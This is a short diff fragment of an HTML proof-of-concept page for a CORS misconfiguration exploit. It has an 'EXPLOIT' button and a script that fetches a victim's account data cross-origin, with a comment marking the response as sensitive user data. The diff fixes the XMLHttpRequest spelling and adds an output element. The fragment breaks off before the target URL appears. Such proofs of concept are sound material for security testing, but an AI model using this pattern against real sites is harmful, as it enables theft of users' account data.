@@ -33,9 +33,10 @@
 </head>
 <body>
     <button type="button" onclick="cors()" class="inline-button" >EXPLOIT</button>
+    <p id="demo"></p>
     <script>
     function cors(){
-        var xhttp = new XMLhttpRequest();
+        var xhttp = new XMLHttpRequest();
         xhttp.onreadystatechange = function(){
             if(this.readyState == 4 && this.status == 200) {
                 var a = this.responseText ; // Sensitive data from user account
